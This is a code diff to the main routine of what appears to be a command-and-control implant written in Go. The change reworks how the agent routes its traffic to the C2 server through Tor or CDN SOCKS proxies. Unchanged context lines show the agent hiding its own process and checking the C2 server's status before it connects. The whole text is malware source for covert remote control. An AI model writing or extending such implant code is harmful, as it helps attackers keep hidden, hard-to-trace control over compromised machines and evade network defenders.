@@ -91,7 +91,6 @@ func main() {
 			}
 		}
 	}
-	agent.HTTPClient = tun.EmpHTTPClient(agent.AgentProxy)
 
 	// parse C2 address
 	ccip := strings.Split(agent.CCAddress, "/")[2]
@@ -105,18 +104,17 @@ func main() {
 	// if CC is behind tor, a proxy is needed
 	if tun.IsTor(agent.CCAddress) {
 		log.Printf("CC is on TOR: %s", agent.CCAddress)
-		if *c2proxy == "" {
-			log.Fatalf("CC is on TOR (%s), you have to specify a tor proxy for it to work", agent.CCAddress)
-		}
 		agent.Transport = "TOR"
+		agent.AgentProxy = *c2proxy
 		if *c2proxy == "" {
-			agent.HTTPClient = tun.EmpHTTPClient("socks5://127.0.0.1:9050")
+			agent.AgentProxy = "socks5://127.0.0.1:9050"
 		}
+		log.Printf("CC is on TOR (%s), using %s as TOR proxy", agent.CCAddress, agent.AgentProxy)
 	}
 
 	// if user specified a proxy, use it
 	if *c2proxy != "" {
-		agent.HTTPClient = tun.EmpHTTPClient(*c2proxy)
+		agent.AgentProxy = *c2proxy
 	}
 
 	// if user wants to use CDN proxy
@@ -135,7 +133,7 @@ func main() {
 			}
 		}()
 		agent.Transport = fmt.Sprintf("CDN (%s)", *cdnProxy)
-		agent.HTTPClient = tun.EmpHTTPClient("socks5://127.0.0.1:10888")
+		agent.AgentProxy = "socks5://127.0.0.1:10888"
 	}
 
 	// hide process of itself if possible
@@ -143,6 +141,9 @@ func main() {
 	if err != nil {
 		log.Print(err)
 	}
+
+	// apply whatever proxy setting we have just added
+	agent.HTTPClient = tun.EmpHTTPClient(agent.AgentProxy)
 connect:
 
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
